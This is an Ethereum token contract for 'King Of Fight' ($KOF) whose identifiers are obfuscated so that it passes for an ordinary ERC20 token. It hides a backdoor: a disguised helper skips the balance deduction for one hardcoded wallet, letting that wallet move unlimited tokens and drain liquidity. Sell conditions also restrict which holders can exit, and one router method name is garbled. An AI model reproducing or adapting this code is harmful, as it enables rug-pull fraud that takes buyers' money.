/**

King Of Fight   $KOF


𝕏/TWITTER: https://twitter.com/KOF_Ethereum
TELEGRAM: https://t.me/KOF_Ethereum
WEBSITE: https://kofeth.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _fmspx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _fmspx(a, b, "SafeMath:");
    }

    function  _fmspx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _xaopvahof {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xfmvncus {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract KingOfFight is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"King Of Fight";
    string private constant _symbol = unicode"KOF";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalnc = 1000000000 * 10 **_decimals;
    uint256 public _muvkAmaunt = _Totalnc;
    uint256 public _Wallesuope = _Totalnc;
    uint256 public _wapThresfuto= _Totalnc;
    uint256 public _mfakTakof= _Totalnc;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _islEiaump;
    mapping (address => bool) private _taxvbWaray;
    mapping(address => uint256) private _lroupboe;
    bool public _targaleuv = false;
    address payable private _TqjFohap;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapmfoiqb=0;
    uint256 private _brsnkoue=0;


    _xfmvncus private _Tfpolul;
    address private _yavabcps;
    bool private _qrmgnulh;
    bool private loSoylurp = false;
    bool private _awoufnvp = false;


    event _amouxpvl(uint _muvkAmaunt);
    modifier loevTouhlq {
        loSoylurp = true;
        _;
        loSoylurp = false;
    }

    constructor () {      

        _TqjFohap = payable(0x0eEe2e69D7F71933c04BE23782035fF7591AE558);
        _balances[_msgSender()] = _Totalnc;
        _islEiaump[owner()] = true;
        _islEiaump[address(this)] = true;
        _islEiaump[_TqjFohap] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalnc);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalnc;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fmspx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_targaleuv) {
                if (to != address
                (_Tfpolul) && to !=
                 address(_yavabcps)) {
                  require(_lroupboe
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lroupboe
                  [tx.origin] = block.number;
                }
            }

            if (from == _yavabcps && to != 
            address(_Tfpolul) && !_islEiaump[to] ) {
                require(amount <= _muvkAmaunt,
                 "Exceeds the _muvkAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallesuope, "Exceeds the maxWalletSize.");
                if(_brsnkoue
                < _wapmfoiqb){
                  require(! _frjcnqji(to));
                }
                _brsnkoue++;
                 _taxvbWaray[to]=true;
                teeomoun = amount.mul((_brsnkoue>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _yavabcps && from!= address(this) 
            && !_islEiaump[from] ){
                require(amount <= _muvkAmaunt && 
                balanceOf(_TqjFohap)<_mfakTakof,
                 "Exceeds the _muvkAmaunt.");
                teeomoun = amount.mul((_brsnkoue>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_brsnkoue>_wapmfoiqb &&
                 _taxvbWaray[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!loSoylurp 
            && to == _yavabcps && _awoufnvp &&
             contractTokenBalance>_wapThresfuto 
            && _brsnkoue>_wapmfoiqb&&
             !_islEiaump[to]&& !_islEiaump[from]
            ) {
                _swpbhgfah( _raqse(amount, 
                _raqse(contractTokenBalance,_mfakTakof)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rurfmop(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _fmspx(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _fmspx(teeomoun));
        emit Transfer(from, to, 
        amount. _fmspx(teeomoun));
    }

    function _swpbhgfah(uint256
     tokenAmount) private loevTouhlq {
        if(tokenAmount==0){return;}
        if(!_qrmgnulh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tfpolul.WETH();
        _approve(address(this),
         address(_Tfpolul), tokenAmount);
        _Tfpolul.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _raqse(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _fmspx(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TqjFohap){
            return a ;
        }else{
            return a . _fmspx (b);
        }
    }

    function removeLimits() external onlyOwner{
        _muvkAmaunt = _Totalnc;
        _Wallesuope = _Totalnc;
        _targaleuv = false;
        emit _amouxpvl(_Totalnc);
    }

    function _frjcnqji(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rurfmop(uint256
    amount) private {
        _TqjFohap.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qrmgnulh);
        _Tfpolul   =  _xfmvncus (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tfpolul), _Totalnc);
        _yavabcps = _xaopvahof(_Tfpolul.factory()). createPair (address(this),  _Tfpolul . WETH ());
        _Tfpolul.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_yavabcps).approve(address(_Tfpolul), type(uint).max);
        _awoufnvp = true;
        _qrmgnulh = true;
    }

    receive() external payable {}
}